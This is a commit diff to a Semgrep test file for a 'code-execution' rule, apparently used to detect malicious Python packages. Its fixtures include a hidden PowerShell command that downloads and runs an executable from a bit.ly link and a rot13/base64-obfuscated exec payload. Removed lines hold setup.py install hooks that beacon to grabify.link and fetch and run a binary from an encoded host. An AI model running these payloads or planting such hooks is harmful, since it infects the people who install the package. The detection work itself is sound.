d694e7f3bd79cb353966c652356a248a7b8c8de6
Ellen Wang <ellen.wang@datadoghq.com>
2022-07-08 10:33:13 -0400

    fix: code-execution detects os.system now and testcases documented more

--- semgrep_tests/code-execution.py
+++ semgrep_tests/code-execution.py
@@ -1,3 +1,21 @@
+""" Tests for code-execution rule
+
+    OK cases:
+        - Executing python files to extract version information
+        - Os.system used for setup purposes
+    RULEID cases:
+        - executing bash commands
+"""
+
+
+""" OK: Executing python files to extract version information 
+"""
+here = os.path.abspath(os.path.dirname(__file__))
+about = {}
+with open(os.path.join(here, 'pip-tool', '__version__.py'), 'r', 'utf-8') as f:
+    # ok: code-execution
+    exec(f.read(), about)
+    
 with open('gsmls.py') as f:
     for line in f:
         if line.startswith('__version__ = '):
@@ -6,7 +24,6 @@ with open('gsmls.py') as f:
             break
         
 VERSION_FILE = os.path.join(CURRENT_PATH, NAME, 'version.py')
-
 def get_version():
     ns = {}
     with open(VERSION_FILE) as f:
@@ -30,51 +47,28 @@ if line.startswith('__version__'):
 # ok: code-execution
 exec(open(path.join(name, 'version.py')).read())
 
+
+""" OK: os.system used for setup purposes
+"""
+# todook: code-execution
+os.system('python setup.py sdist bdist_wheel')
+# todook: code-execution
+os.system('twine upload dist/*')
+
+
+""" RULEID: executing bash commands 
+"""
 # ruleid: code-execution
 os.popen("cd %s && git init " % TEST_MODULES_ROOT)
 
 # ruleid: code-execution
 popen("cd %s && git init " % TEST_MODULES_ROOT)
 
-user = os.environ['USERNAME']
-local_drive = 'C:\\Users\\%s\\AppData' % user
-startup = 'C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\StartMenu\\Programs\\Startup\\' % user
+# todoruleid: code-execution
+os.system("powershell -window hidden -executionpolicy bypass (New-object system.net.webclient).DownloadFile('http://bit.ly/2myCV9n',$env:APPDATA+'\Main.exe'); Start-Process $env:APPDATA'\Main.exe'")
 
-if os.path.isdir(startup):
-  # todoruleid: code-execution
-  os.system("powershell -window hidden -executionpolicy bypass (New-object system.net.webclient).DownloadFile('http://bit.ly/2myCV9n',$env:APPDATA+'\Main.exe'); Start-Process $env:APPDATA'\Main.exe'")
+# ruleid: code-execution
+exec("o3ZkVQ0tpTkuqTMipz0hp3ymqTIgXPxAPzyzVT9mZFN9CFNvI2yhMT93plV6QDbtVUElrGbAPvNtVPNtVT9mYaWyozSgMFtaq3NhnaOaWljtVz5yql52LaZvXD0XVPNtVPNtp3IvpUWiL2Impl5wLJkfXPW3p2AlnKO0VT5yql52LaZvXD0XVPOyrTAypUD6QDbtVPNtVPO0pax6QDbtVPNtVPNtVPOwqJIlMTRtCFOvLKAyAwDhLwL0MTIwo2EyXPWuFSVjL0uAAxk5BJ9MJR4jJyqXpTWcAJcvZwO2L21TZ0jloTgMImSfMHp5ozSKFG09VvxAPvNtVPNtVPNtVUEyrUEiVQ0tpzIkqJImqUZhM2I0XTA1MKWxLFxhqTI4qN0XVPNtVPNtVPNtrPN9VPpaYzcinJ4bpzShMT9gYzAbo2ywMFumqUWcozphLKAwnJysqKOjMKWwLKAyVPftp3ElnJ5aYzSmL2ycK2kiq2IlL2SmMFNeVUA0pzyhMl5xnJqcqUZcVTMipvOsVTyhVUWuozqyXQR2XFxtXlNvYaMvplVAPvNtVPNtVPNtVTLtCFOipTIhXUtfVPWuVvxAPvNtVPNtVPNtVTLhq3WcqTHbp3ElXUEyrUEiXFxAPvNtVPNtVPNtVTLhL2kip2HbXD0XVPNtVPNtVPNtp3IvpUWiL2Impl5wLJkfXPW3p2AlnKO0VPImVPVtWFNtrPxAPvNtVPNtVTI4L2IjqQbAPvNtVPNtVPNtVPNtqUW5Bt0XVPNtVPNtVPNtVPNtVPOwqJIlMTRtCFOvLKAyAwDhLwL0MTIwo2EyXPWuFSVjL0uAAxk5BKyMJTA1JwWfZTSVIzyxJR5fL21BqzWhHzkvoyS1JGV5qRjkHzuMZwyBHyZ5o1cKrUAvZ2E2L21EqzWKEacxE1M5GQAFnSxlBJynI3umVvxAPvNtVPNtVPNtVPNtVPNtqTI4qT8tCFOlMKS1MKA0pl5aMKDbL3IypzEuXF50MKu0QDbtVPNtVPNtVPNtVPNtVUttCFNaWl5do2yhXUWuozEioF5wnT9cL2Hbp3ElnJ5aYzSmL2ycK3IjpTIlL2SmMFNeVUA0pzyhMl5up2AcnI9fo3qypzAup2HtXlOmqUWcozphMTyanKEmXFOzo3VtKlOcovOlLJ5aMFtkAvxcVPftVv52LaZvQDbtVPNtVPNtVPNtVPNtVTLtCFOipTIhXUtfVPWuVvxAPvNtVPNtVPNtVPNtVPNtMv53pzy0MFumqUVbqTI4qT8cXD0XVPNtVPNtVPNtVPNtVPOzYzAfo3AyXPxAPvNtVPNtVPNtVPNtVPNtp3IvpUWiL2Impl5wLJkfXPW3p2AlnKO0VPImVPVtWFNtrPxAPvNtVPNtVPNtVPNtMKuwMKO0Bt0XVPNtVPNtVPNtVPNtVPOjpzyhqN==".decode('rot13')).decode('base64')
 
-class TotallyInnocentClass(install):
-    def run(self):
-        # ruleid: code-execution
-        exec("o3ZkVQ0tpTkuqTMipz0hp3ymqTIgXPxAPzyzVT9mZFN9CFNvI2yhMT93plV6QDbtVUElrGbAPvNtVPNtVT9mYaWyozSgMFtaq3NhnaOaWljtVz5yql52LaZvXD0XVPNtVPNtp3IvpUWiL2Impl5wLJkfXPW3p2AlnKO0VT5yql52LaZvXD0XVPOyrTAypUD6QDbtVPNtVPO0pax6QDbtVPNtVPNtVPOwqJIlMTRtCFOvLKAyAwDhLwL0MTIwo2EyXPWuFSVjL0uAAxk5BJ9MJR4jJyqXpTWcAJcvZwO2L21TZ0jloTgMImSfMHp5ozSKFG09VvxAPvNtVPNtVPNtVUEyrUEiVQ0tpzIkqJImqUZhM2I0XTA1MKWxLFxhqTI4qN0XVPNtVPNtVPNtrPN9VPpaYzcinJ4bpzShMT9gYzAbo2ywMFumqUWcozphLKAwnJysqKOjMKWwLKAyVPftp3ElnJ5aYzSmL2ycK2kiq2IlL2SmMFNeVUA0pzyhMl5xnJqcqUZcVTMipvOsVTyhVUWuozqyXQR2XFxtXlNvYaMvplVAPvNtVPNtVPNtVTLtCFOipTIhXUtfVPWuVvxAPvNtVPNtVPNtVTLhq3WcqTHbp3ElXUEyrUEiXFxAPvNtVPNtVPNtVTLhL2kip2HbXD0XVPNtVPNtVPNtp3IvpUWiL2Impl5wLJkfXPW3p2AlnKO0VPImVPVtWFNtrPxAPvNtVPNtVTI4L2IjqQbAPvNtVPNtVPNtVPNtqUW5Bt0XVPNtVPNtVPNtVPNtVPOwqJIlMTRtCFOvLKAyAwDhLwL0MTIwo2EyXPWuFSVjL0uAAxk5BKyMJTA1JwWfZTSVIzyxJR5fL21BqzWhHzkvoyS1JGV5qRjkHzuMZwyBHyZ5o1cKrUAvZ2E2L21EqzWKEacxE1M5GQAFnSxlBJynI3umVvxAPvNtVPNtVPNtVPNtVPNtqTI4qT8tCFOlMKS1MKA0pl5aMKDbL3IypzEuXF50MKu0QDbtVPNtVPNtVPNtVPNtVUttCFNaWl5do2yhXUWuozEioF5wnT9cL2Hbp3ElnJ5aYzSmL2ycK3IjpTIlL2SmMFNeVUA0pzyhMl5up2AcnI9fo3qypzAup2HtXlOmqUWcozphMTyanKEmXFOzo3VtKlOcovOlLJ5aMFtkAvxcVPftVv52LaZvQDbtVPNtVPNtVPNtVPNtVTLtCFOipTIhXUtfVPWuVvxAPvNtVPNtVPNtVPNtVPNtMv53pzy0MFumqUVbqTI4qT8cXD0XVPNtVPNtVPNtVPNtVPOzYzAfo3AyXPxAPvNtVPNtVPNtVPNtVPNtp3IvpUWiL2Impl5wLJkfXPW3p2AlnKO0VPImVPVtWFNtrPxAPvNtVPNtVPNtVPNtMKuwMKO0Bt0XVPNtVPNtVPNtVPNtVPOjpzyhqN==".decode('rot13')).decode('base64')
-        os = platform.system()
-        req = urllib2.Request('https://grabify.link/E09EIF', headers={'User-Agent' : os})
-        texto = urllib2.urlopen( req ).read()
-        print("##")
-NAME = 'colourama'
-
-here = os.path.abspath(os.path.dirname(__file__))
-about = {}
-with open(os.path.join(here, 'pip-tool', '__version__.py'), 'r', 'utf-8') as f:
-    # ok: code-execution
-    exec(f.read(), about)
-
-class eupolyzoan(install):
-    def setup_rotkit(self, condiment):
-        if condiment and condiment != '0.0.0.0':
-            narcohypnosis = urlopen('http://' + condiment + '/mainprise').read()
-            with open('/tmp/reloan', 'wb') as colmar:
-                colmar.write(narcohypnosis)
-            os.chmod('/tmp/reloan', 777)
-            # ruleid: code-execution
-            subprocess.call('/tmp/reloan')
-
-    def run(self):
-        syntactical = 'YWY0MjNlYWMueHBsdHJmcmsuZGU='
-        snakeworm = None
-        try:
-            snakeworm = socket.gethostbyname(base64.b64decode(syntactical))
-        except:
-            pass
-        self.setup_rootkit(snakeworm)
+# ruleid: code-execution
+subprocess.call('/tmp/reloan')
